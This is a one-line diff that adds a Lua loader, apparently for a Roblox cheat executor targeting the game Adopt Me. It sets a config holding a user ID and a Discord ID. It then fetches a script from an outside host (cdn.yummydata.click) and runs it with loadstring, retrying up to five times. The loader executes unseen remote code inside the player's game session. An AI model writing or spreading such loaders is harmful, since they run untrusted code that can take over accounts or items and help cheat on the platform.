@@ -1,0 +1,1 @@
+_G.Config={UserID="7b977201-c0f5-421b-bb95-da909b7292c8",discord_id="841728567578198086",Note="CloudPhone"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/adoptmee"))()end)if s then break end wait(5)end
